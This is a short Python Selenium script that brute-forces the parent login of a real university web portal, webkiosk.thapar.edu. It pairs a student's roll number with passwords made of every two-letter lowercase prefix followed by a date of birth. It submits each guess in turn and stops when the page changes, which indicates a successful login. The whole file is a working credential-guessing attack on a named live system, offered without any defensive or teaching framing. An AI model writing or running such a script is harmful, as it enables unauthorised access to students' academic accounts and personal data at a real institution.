import webbrowser
import selenium
from selenium import webdriver 
from selenium.webdriver.support.ui import Select
import string
import time


alpha = list(string.ascii_lowercase)
brute_key = list()

for i in alpha : 
    for j in alpha :
        out = i+j
        brute_key.append(out)

dob = input("Date of birth  : ")
rn = input("RollNumber : ")


brute_pass = list()

for i in brute_key:
    out = i+dob
    brute_pass.append(out)

print(brute_pass)    


url = 'https://webkiosk.thapar.edu/index.jsp'
browser = webdriver.Chrome('./chromedriver') 
browser.get(url)


for i in brute_pass:
    print(i) 
    select_M = Select(browser.find_element_by_name('UserType'))
    select_M.select_by_visible_text('Parents')
    select_M.select_by_value('P')

    select_E = browser.find_element_by_name('MemberCode')
    select_E.send_keys(rn)

    select_P = browser.find_element_by_name('Password')
    select_P.send_keys(i)


    click_S = browser.find_element_by_id('BTNSubmit')
    click_S.click()

    body_scroll = browser.find_element_by_tag_name('body')
    val = body_scroll.get_attribute('scroll')

    time.sleep(1)

    
    if val == 'no' : 
        back_btn = browser.find_element_by_tag_name('a')
        back_btn.click()
    
    else : 
        break

